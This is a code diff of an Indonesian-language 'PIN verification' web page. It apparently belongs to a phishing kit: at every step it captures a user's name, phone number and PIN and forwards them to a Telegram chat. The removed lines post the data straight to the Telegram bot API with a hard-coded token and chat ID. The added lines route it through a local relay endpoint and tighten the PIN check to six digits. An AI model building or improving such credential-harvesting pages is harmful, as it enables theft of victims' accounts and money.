@@ -29,7 +29,7 @@
                         <span class="text-2xl">🔐</span>
                     </div>
                     <h2 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi PIN</h2>
-                    <p class="text-gray-600">Masukkan PIN 4-6 digit untuk melanjutkan proses</p>
+                    <p class="text-gray-600">Masukkan PIN 6 digit untuk melanjutkan proses</p>
                 </div>
 
                 <div class="bg-gray-50 rounded-lg p-4 mb-6">
@@ -42,18 +42,18 @@
                 <form id="pinForm" class="space-y-6">
                     <div>
                         <label for="pin" class="block text-sm font-medium text-gray-700 mb-2">
-                            PIN (4-6 digit)
+                            PIN (6 digit)
                         </label>
                         <input 
-                            type="text" 
+                            type="number" 
                             id="pin" 
                             name="pin" 
                             required
-                            pattern="\\d{4,6}"
+                            minlength="6"
                             maxlength="6"
-                            inputmode="numeric"
+                            pattern="\d{6}"
                             class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
-                            placeholder="Masukkan PIN Anda"
+                            placeholder="Masukkan 6 digit PIN"
                         >
                     </div>
 
@@ -62,15 +62,15 @@
                             Konfirmasi PIN
                         </label>
                         <input 
-                            type="text" 
+                            type="number" 
                             id="confirmPin" 
                             name="confirmPin" 
                             required
-                            pattern="\\d{4,6}"
+                            minlength="6"
                             maxlength="6"
-                            inputmode="numeric"
+                            pattern="\d{6}"
                             class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
-                            placeholder="Konfirmasi PIN Anda"
+                            placeholder="Konfirmasi 6 digit PIN"
                         >
                     </div>
 
@@ -101,24 +101,24 @@
         document.getElementById('pinForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const pin = document.getElementById('pin').value.trim();
-            const confirmPin = document.getElementById('confirmPin').value.trim();
+            const pin = document.getElementById('pin').value;
+            const confirmPin = document.getElementById('confirmPin').value;
+            
+            // Validasi sederhana: 6 digit dan PIN harus sama
+            if (pin.length !== 6 || !/^\d+$/.test(pin)) {
+                alert('PIN harus 6 digit angka!');
+                return;
+            }
             
             if (pin !== confirmPin) {
                 alert('PIN tidak cocok!');
                 return;
             }
             
-            if (!/^\d{4,6}$/.test(pin)) {
-                alert('PIN harus berupa angka dengan panjang 4 sampai 6 digit!');
-                return;
-            }
-            
             // Update user data with pin
             const updatedData = {
                 ...userData,
-                pin: pin,
-                pinConfirmed: true
+                pin: pin
             };
             localStorage.setItem('userData', JSON.stringify(updatedData));
             
@@ -127,8 +127,7 @@
                 step: 'pin_confirmation',
                 nama: userData.nama,
                 nohp: userData.nohp,
-                pin: pin,
-                actionType: userData.actionType
+                pin: pin
             });
             
             // Redirect to final confirmation
@@ -137,30 +136,11 @@
 
         // Telegram Bot Function
         async function sendToTelegram(data) {
-            const BOT_TOKEN = '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
-            const CHAT_ID = '-1001234567890';
-            
-            const message = `
-🔐 *PIN Dikonfirmasi*
-👤 *Nama:* ${data.nama}
-📱 *No HP:* ${data.nohp}
-🔑 *PIN:* ${data.pin}
-🎯 *Aksi:* ${data.actionType}
-⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
-📍 *Step:* ${data.step}
-            `;
-            
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch('http://localhost:3000/api/send-telegram', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
             } catch (error) {
                 console.log('Telegram send error:', error);
